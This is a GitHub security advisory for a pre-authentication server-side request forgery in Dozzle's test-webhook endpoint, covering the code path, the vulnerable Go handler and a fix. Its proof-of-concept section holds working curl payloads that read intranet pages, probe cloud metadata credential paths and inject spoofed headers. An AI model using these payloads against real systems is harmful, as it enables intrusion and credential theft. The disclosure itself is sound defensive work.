# [H] Dozzle: Pre-auth SSRF with response-body reflection via POST /api/notifications/test-webhook (default no-auth deploy)

## Summary
Severity: High
Advisory: GHSA-3v9w-6365-9w54
CVE: CVE-2026-45298
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-3v9w-6365-9w54
Type: github-advisory

## Affected
- Go: `github.com/amir20/dozzle` — affected >=0

## Details
## Summary

In a default dozzle deploy (the documented quickstart, no `DOZZLE_AUTH_PROVIDER` set), `POST /api/notifications/test-webhook` is reachable without authentication and forwards an attacker-controlled URL into a `WebhookDispatcher` that:

- Sends an HTTP POST to the supplied URL with attacker-controlled request headers, and
- Returns the response status code AND up to 1MB of the response body to the caller, when the target replies non-2xx.

This is a classic full-reflection SSRF, pre-auth, against any IP/port that dozzle's host can route to — including private subnets, link-local cloud metadata, and loopback services.

## Affected versions

`internal/notification/dispatcher/webhook.go` and `internal/web/notifications.go` at commit `581bab3a43ead84ea4d009a469a17af98fb3377f` and earlier (the test-webhook handler has been in place since the notifications subsystem was added).

## Default-deploy reachability chain

```
main.go:58-59           → enforces AuthProvider in {none, forward-proxy, simple}
support/cli/args.go:18  → AuthProvider default is "none"
main.go:231-243         → when AuthProvider == "none", web.AuthProvider stays at NONE
internal/web/routes.go:130-132, 137-138 → auth middleware only registered if Provider != NONE
internal/web/routes.go:172-188          → /api/notifications/* (incl. /test-webhook) is inside that conditional Group
```

So the default Quickstart deploy

```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock -p 8080:8080 amir20/dozzle:latest
```

exposes `POST /api/notifications/test-webhook` to the network without any authentication.

## The vulnerable handler

```go
// internal/web/notifications.go:652-716
func (h *handler) testWebhook(w http.ResponseWriter, r *http.Request) {
    var input TestWebhookInput
    if err := json.NewDecoder(r.Body).Decode(&input); err != nil { ... }
    ...
    webhook, err := dispatcher.NewWebhookDispatcher("test", input.URL, templateStr, input.Headers)
    ...
    result := webhook.SendTest(r.Context(), mockNotification)
    ...
    writeJSON(w, http.StatusOK, &TestWebhookResult{
        Success:    result.Success,
        StatusCode: statusCode,
        Error:      errStr,
    })
}
```

`input.URL` and `input.Headers` are entirely user-controlled. No host/IP/scheme validation anywhere.

## The reflection sink

```go
// internal/notification/dispatcher/webhook.go:88-120
req, err := http.NewRequestWithContext(ctx, http.MethodPost, w.URL, bytes.NewReader(payload))
...
for k, v := range w.Headers { req.Header.Set(k, v) }
...
resp, err := w.client.Do(req)
...
if resp.StatusCode < 200 || resp.StatusCode >= 300 {
    limitedReader := io.LimitReader(resp.Body, 1024*1024)   // 1 MB
    responseBody, _ := io.ReadAll(limitedReader)
    ...
    return TestResult{
        Success:    false,
        StatusCode: resp.StatusCode,
        Error:      fmt.Sprintf("webhook returned status code %d: %s",
                                 resp.StatusCode, string(responseBody)),
    }
}
```

When the SSRF target returns non-2xx, up to 1 MB of response body becomes part of `Error`, which is then JSON-encoded back to the attacker.

## PoC

### A. Read intranet admin-panel response bodies (most common path)

Most internal admin UIs respond to anonymous POST with 401/403 + an HTML or JSON body that contains version banners, CSRF tokens, internal hostnames, etc.

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://192.168.1.1/admin/index.html","headers":{}}' \
  http://dozzle.example.com/api/notifications/test-webhook
```

Response shape (`writeJSON` to the public Internet):
```json
{
  "Success": false,
  "StatusCode": 401,
  "Error": "webhook returned status code 401: <html><head>... full intranet HTML body, up to 1MB ...</html>"
}
```

### B. Cloud IMDS reachability probe

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","headers":{}}' \
  http://dozzle.example.com/api/notifications/test-webhook
```

If `StatusCode == 200`, IMDS is reachable. For AWS IMDSv2 the unauth POST returns 401 + body which IS reflected.

### C. Header injection downstream

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{
    "url":"http://internal-api.example.com:8080/admin/users",
    "headers":{"X-Forwarded-User":"admin","X-Real-IP":"127.0.0.1"}
  }' \
  http://dozzle.example.com/api/notifications/test-webhook
```

## Suggested fix

1. **Refuse `test-webhook` when `Authorization.Provider == NONE`.** This is an admin-configuration helper; it should not be reachable on a deploy that has no concept of admin.
2. **SSRF-harden `WebhookDispatcher`.** Resolve URL host once via `net.LookupIP`; refuse private/loopback/link-local/CGNAT; pin `http.Transport.DialContext` to the resolved IP (closes DNS-rebinding TOCTOU). Refuse non-http(s) schemes.
3. **Stop reflecting response body.** UX for "test webhook" only needs `Success: bool, StatusCode: int`.

## Severity

- **CVSS 3.1:** High — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` ≈ 7.5 in default no-auth deploy.
- **Auth:** none in default deploy. With `DOZZLE_AUTH_PROVIDER=simple` configured, the same primitive is post-auth.

## Reproduction environment

- Tested against: `amir20/dozzle:8.x` Docker image (commit `581bab3a43ead84ea4d009a469a17af98fb3377f`).
- Code locations:
  - Handler: `internal/web/notifications.go:652-716`
  - Sink: `internal/notification/dispatcher/webhook.go:88-120`
  - Auth gate: `internal/web/routes.go:130-138, 172-188`
  - Default provider: `internal/support/cli/args.go:18`, `main.go:231`

## Reporter

Eddie Ran. Filed via reporter API per dozzle's `SECURITY.md`.

## References
- https://github.com/amir20/dozzle/security/advisories/GHSA-3v9w-6365-9w54
- https://nvd.nist.gov/vuln/detail/CVE-2026-45298
- https://github.com/amir20/dozzle
- https://github.com/amir20/dozzle/releases/tag/v10.5.2
